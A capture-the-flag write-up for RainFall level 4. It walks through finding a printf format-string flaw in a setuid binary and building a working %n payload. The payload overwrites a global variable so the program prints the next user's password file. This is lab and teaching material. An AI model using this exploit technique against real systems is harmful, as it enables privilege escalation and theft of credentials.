# LEVEL4

## 1. Inspect The Executable

```bash
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with level5 privileges.

```bash
level4@RainFall:~$ ./level4 


level4@RainFall:~$ ./level4 
a
a
level4@RainFall:~$ ./level4 
abc
abc
level4@RainFall:~$ ./level4 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program waits for **user input**, most likely a call to `read` or a `gets` and prints it back. But there is no segfault error.


## 2. Analyze The Executable

```bash
(gdb) info functions 
All defined functions:

Non-debugging symbols:
[...]
0x08048444  p
0x08048457  n
0x080484a7  main
[...]
```

Using the gdb command `info functions`, we can list all functions present in the binary.
Here, we find 3 interesting functions: `main`, `n` and `p`.

## Program Behavior

#### main function

The `main` function calls `n()` then returns.

### n function 

The `n` function first calls `fgets()` on `stdout` to store the input in a **local variable** `level_20c` with a **size limit** of `0x200` (i.e 512 in hexadecimal).

Then it's check if a unknow variable (probably gobal) `m` is equal to `0x1025544` (i.e 16930116 in hexadecimal). If the condition is `true`, the program calls `system("/bin/cat /home/user/level5/.pass")`.

### p function 

The `p` function prints user-controlled input by calling `printf()` directly.

## 3. Exploit Development

In this level, we can again use the **Format String Attack**.

---

### Exploit Principle

The goal is to modify the global variable `m` so that its value becomes `0x1025544`, which triggers the call to `system("/bin/cat /home/user/level5/.pass")`.

Here is the following attack structure:
```
<memory address to update>	<padding>	<%X$n>
```

Where:
  - `<memory address to update>` is the **address** of the **target variable** (`m`).
  - `<padding>` represents the **number of characters** to print.
  - `<%X$n>` **writes** the number of printed characters to the **memory address** located at position `X` on the **stack**.

The total **number of printed characters** (i.e `<memory address to update>` + `<padding>`) determines the **value written** to the target address.

`%X$n` is a **positional format specifier** that allows writing to memory.

Structure:
- `%`  : begins the **format directive**.
- `X$` : indicates which **stack argument** (represented by `X`) is used as the **destination address**.
- `n`  : **writes** the number of characters printed so far **into that address**.

---

### Get Exploit Values

First, we use `%x` to **find the position** of our **input** on the **stack**:

```bash
level4@RainFall:~$ python -c "print 'aaaa' + '%x %x %x %x %x %x %x %x %x %x %x %x' " | ./level4
aaaab7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 61616161
```

`aaaa` corresponding to `61616161` in hexadecimal appears at the **12th position** on the stack.
This position will be used in the last part of the format string: `<%X$n>`.

---

Next, we need the address of the **target variable**.

From the assembly dump, we can find the `if` statement:

```s
   0x0804848d <+54>:	mov    0x8049810,%eax
   0x08048492 <+59>:	cmp    $0x1025544,%eax
```

The **target address** is therefore : `0x8049810`. In little-endian format:
```
\x10\x98\x04\x08
```

---

Finally, we need to implement the **value to write**. Here, the target value is `0x1025544` (16930116 in decimal), structured as follows:

```
<memory address to update>  +   <padding>	
              4             +	16930112      = 16930116
```

The padding ensures that exactly **16930116 characters** are printed before the `%n` **writes** this value **into the target address**.

---

This approach would **cause an error**. Printing `16930116` **characters** would be **too much** for the **program** and would result in a `Broken pipe`.

Instead of writing `16930116` `a` characters, we can use a **formatted padding** with `%x`, like this: `%16930116x`.

`%x` **prints** and **pops** the value at the **top of the stack**.  
When a width is specified, `printf` uses it as a **minimum field width**.

It pads the output with spaces **before** the value so that the total number of printed characters **matches** the **specified width**.

For example, if the value at the top of the stack is `0x02040608`, `%12x` will print:
```bash
    02040608
```

Representing:

```
4 (padding spaces) + 8 (printed value) = 12 characters
```

---

### Create the Payload

```bash
python -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n' "
```

Note:
- The backslash (`\`) in the last element is used to escape the `$` character.

**Explanation:**
- `python`			: launches the Python interpreter.
- `-c` 					: executes the command passed as a string.
- `print` 			: outputs data to standard output.

## 4. Get The Flag

```bash
level4@RainFall:~$ python -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n' " | ./level4
XXX
```